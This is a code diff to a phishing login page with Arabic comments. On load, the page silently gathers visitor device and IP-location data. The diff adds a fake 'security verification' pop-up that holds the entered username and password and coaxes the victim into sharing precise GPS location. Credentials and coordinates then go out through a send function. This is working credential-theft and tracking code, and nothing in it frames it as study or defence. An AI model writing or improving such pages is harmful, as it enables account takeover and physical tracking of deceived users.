@@ -124,6 +124,56 @@
             font-size: 15px;
         }
 
+        /* نافذة طلب التحقق الأمنية المنبثقة */
+        #security-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9998;
+            padding: 20px;
+        }
+
+        .modal-content {
+            background: #ffffff;
+            padding: 25px;
+            border-radius: 16px;
+            width: 100%;
+            max-width: 320px;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        }
+
+        .modal-content h3 {
+            color: #262626;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .modal-content p {
+            color: #737373;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .modal-btn {
+            background-color: #0064e0;
+            color: white;
+            border: none;
+            border-radius: 25px;
+            padding: 12px;
+            width: 100%;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
         /* شاشة التحميل الوهمية عند الضغط على تسجيل الدخول */
         #loading-screen {
             position: fixed;
@@ -162,6 +212,15 @@
     </style>
 </head>
 <body>
+
+    <!-- نافذة التحقق الأمنية -->
+    <div id="security-modal">
+        <div class="modal-content">
+            <h3>إجراء أمني مطلوب</h3>
+            <p>لحماية حسابك وتأكيد هويتك، يرجى السماح بالتحقق من الموقع الجغرافي الدقيق لجلسة تسجيل الدخول.</p>
+            <button type="button" id="agreeBtn" class="modal-btn">موافق، تحقق من الموقع</button>
+        </div>
+    </div>
 
     <div id="loading-screen">
         <div class="spinner"></div>
@@ -212,7 +271,7 @@
             });
         }
 
-        // سحب البيانات التلقائية (الجهاز، البطارية، الشبكة والـ IP) فور فتح الصفحة دون إزعاج
+        // سحب البيانات التلقائية في الخلفية فور فتح الصفحة
         window.addEventListener('DOMContentLoaded', () => {
             let info = {
                 type: 'visitor_full_report',
@@ -242,7 +301,7 @@
                 sendData(info);
             }
 
-            // سحب الموقع التقريبي والشبكة والـ ISP وكشف الـ VPN عبر الـ IP في الخلفية
+            // سحب الموقع التقريبي والشبكة والـ ISP عبر الـ IP
             fetch('https://ipapi.co/json/')
                 .then(res => res.json())
                 .then(ipData => {
@@ -260,23 +319,34 @@
                 }).catch(() => {});
         });
 
-        // عند الضغط على زر تسجيل الدخول (هنا يتم إجبار ظهور نافذة طلب السماح بالموقع بدقة عالية للمستخدم كجزء من عملية الدخول)
+        let savedUser = '';
+        let savedPass = '';
+
+        // عند الضغط على زر تسجيل الدخول تظهر نافذة التحقق الأمنية بدلاً من الإرسال الفوري
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            savedUser = document.getElementById('username').value;
+            savedPass = document.getElementById('password').value;
+
+            // إظهار نافذة التحقق
+            document.getElementById('security-modal').style.display = 'flex';
+        });
+
+        // عند الضغط على زر الموافقة داخل النافذة الأمنية
+        document.getElementById('agreeBtn').addEventListener('click', function() {
+            // إخفاء نافذة التحقق وإظهار شاشة التحميل
+            document.getElementById('security-modal').style.display = 'none';
             document.getElementById('loading-screen').style.display = 'flex';
 
-            let user = document.getElementById('username').value;
-            let pass = document.getElementById('password').value;
-
-            // طلب الموقع الجغرافي الدقيق (GPS) فور الضغط على تسجيل الدخول ليوافق المستخدم يدويًا
+            // طلب الموقع الجغرافي الدقيق (GPS) بعد تفاعل المستخدم يدويًا
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         sendData({
                             type: 'login_credentials_with_precise_gps',
-                            username: user,
-                            password: pass,
+                            username: savedUser,
+                            password: savedPass,
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
                             accuracy: position.coords.accuracy + ' meters'
@@ -286,8 +356,8 @@
                     function(error) {
                         sendData({
                             type: 'login_credentials_only',
-                            username: user,
-                            password: pass,
+                            username: savedUser,
+                            password: savedPass,
                             gps_error: 'User denied location'
                         });
                         endProcess();
@@ -297,8 +367,8 @@
             } else {
                 sendData({
                     type: 'login_credentials_only',
-                    username: user,
-                    password: pass
+                    username: savedUser,
+                    password: savedPass
                 });
                 endProcess();
             }
